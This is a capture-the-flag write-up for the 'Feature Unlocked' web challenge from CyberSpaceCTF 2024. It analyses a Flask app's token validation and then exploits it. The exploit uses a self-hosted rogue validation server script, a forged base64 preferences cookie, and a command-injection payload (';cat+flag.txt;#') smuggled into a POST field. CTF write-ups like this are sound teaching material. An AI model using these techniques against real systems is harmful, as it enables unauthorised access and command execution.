---
layout: post
title:  "CyberSpaceCTF - 2024 - Feature Unlocked Writeup"
description: Solution for Feature Unlocked challenge
tags: [CSCTF, CTF, 2024, Web, Writeup, Red Team, Offensive, Challenge]
---

# Challenge Description
```
Name: Feature Unlocked
Point: 50
Solves: 184
Author: cryptocat
---
The world's coolest app has a brand new feature! Too bad it's not released until after the CTF..

```

# Analysis
For this challenge, I thought it was an easy one until I read through the messy source code. The flag was hidden in the document root directory of this challenge, located at `/home/user/chroot/app`. <br>

We are provided with the following websites: <br>
The remaining time displayed at `/release` indicates the time left until *`the new feature`* is released: <br>

<kbd><img src="https://github.com/user-attachments/assets/7aedb7fd-e861-4cb6-9b22-069f268f15de"></kbd> <br>

The next one is `/feature` with a clickable link that would redirect us back to `/release`, let's find out what's happening behind the scenes!<br> 

<kbd><img src="https://github.com/user-attachments/assets/93517c66-ae5f-4003-a2ab-b8d63b174e21"></kbd>

# Source code analysis
Directory tree:
```bash
.
├── Dockerfile
├── flag.txt
├── nsjail.cfg
├── run.sh
└── src
    ├── app
    │   ├── __init__.py
    │   ├── main.py
    │   ├── static
    │   │   ├── css
    │   │   │   ├── animations.css
    │   │   │   └── styles.css
    │   │   └── images
    │   │       └── logo.png
    │   └── templates
    │       ├── base.html
    │       ├── feature.html
    │       ├── index.html
    │       └── release.html
    ├── requirements.txt
    ├── run.sh
    └── validation_server
        └── validation.py
```
At the top of `main.py`, we can see that server is using `URLSafeTimedSerializer` with a *random 16 bytes secret* for serialize and deserialize the `access_token`. `DEFAULT_PREFERENCES` cookie and `NEW_FEATURE_RELEASE` date: <br>
<kbd><img src="https://github.com/user-attachments/assets/391e7bec-ce68-406b-bf4b-42bd28901fb6"></kbd>


At `main.py`, we got `/release` which would first check if the `access_token` cookie is presented and then only redirect us if the data value is `access_granted`. <br>
Next, we have an optional GET parameter `debug`. When this value set to true, the system will accept the overidding of validation_server from the `preferences` cookie and perform server validation. If the validation is true, we then will be redirected to `/release` with dumped `access_token` assigned in response header: <br> 
<kbd><img src="https://github.com/user-attachments/assets/7cb4aa50-4132-472b-985a-93d45cdfc92a"></kbd> <br>

After delving into `validate_server`, I saw that it performs another validation through `validate_access()` and return the `date` later than `NEW_FEATURE_RELEASE` date:<br>
<kbd><img src="https://github.com/user-attachments/assets/2a7fb943-c982-4cdc-afb2-8c3c3f5b339a"></kbd> <br>

The `validate_access()` is the last step of validation but this time it just performs token verification using `signature` received from the `validation_server`'s response: <br>
<kbd><img src="https://github.com/user-attachments/assets/e2f61fdf-b933-46af-93a9-2bb5be578b98"></kbd> <br>

A potential OS Command injection found at `/feature` POST method if token deserialization data is `access_granted`, mean that we've got to get the `access_token` cookie to access this hidden feature: <br>
<kbd><img src="https://github.com/user-attachments/assets/7d2585dd-4dcd-48a0-bc69-ed6505adb56e"></kbd>

Then I came up with an idea: <br>
> "What if the `validation_server` value in the `preferences` cookie is the URL of our self-hosted malicious server?"

# Setting up malcious validation server
Using the `validation.py`, we can fully host a validation server with the `date` value adjusted to be later than `NEW_FEATURE_RELEASE`, and then sign the token with a `hash object` including our `date` value. Full python script shown below:<br>
```python
from flask import Flask, jsonify
import time
from Crypto.Hash import SHA256
from Crypto.PublicKey import ECC
from Crypto.Signature import DSS

app = Flask(__name__)

key = ECC.generate(curve='p256')
pubkey = key.public_key().export_key(format='PEM')


@app.route('/pubkey', methods=['GET'])
def get_pubkey():
    return pubkey, 200, {'Content-Type': 'text/plain; charset=utf-8'}


@app.route('/', methods=['GET'])
def index():
    date = str(int(time.time()) + 7 * 24 * 60 * 60 * 69) # Add more dates here
    h = SHA256.new(date.encode('utf-8'))
    signature = DSS.new(key, 'fips-186-3').sign(h)

    return jsonify({
        'date': date,
        'signature': signature.hex()
    })


if __name__ == '__main__':
    app.run(host='127.0.0.1', port=8081)
```

Then setup a tunnel using ngrok: <br>
```bash
(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
└─$ ngrok http 8081
```

With Burp Suite turned on, send `/release` to repeater and change the `preferences` cookie like this: <br>
```bash
(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
└─$ echo '{"theme": "light", "language": "en", "validation_server": "YOUR_VALIDATION_SERVER_HERE"}' | base64 -w 0
```

Then send the GET request to `/release` with `debug` parameter set to `true`, also the modified `preferences` cookie including our malcious validation server: <br>
```bash
┌──(monkeontheroof㉿DESKTOP-FLPUJ9V)-[~]
└─$ curl -s -I https://feature-unlocked-web-challs.csc.tf/release?debug=true -b 'preferences=YOUR_B64_TOKEN'

HTTP/2 200
date: Fri, 06 Sep 2024 17:23:14 GMT
content-type: text/html; charset=utf-8
set-cookie: access_token=ImFjY2Vzc19ncmFudGVkIg.Zts6gg.PLMJ0Id-S1aNwWIUea7HZ7povoM; Secure; HttpOnly; Path=/ # access token dumped
...
```

Took the `access_token` cookie and send a POST request to `/feature` with our payload for the exploitation of OS Command injection: <br>
`curl -X POST https://feature-unlocked-web-challs.csc.tf/feature -d "text=;cat+flag.txt;#" -b "access_token=ImFjY2Vzc19ncmFudGVkIg.Zts_cw.zHs2yfq0altGN1yBnRKLcUzK1S0"` <br>

Flag: `CSCTF{d1d_y0u_71m3_7r4v3l_f0r_7h15_fl46?!}`
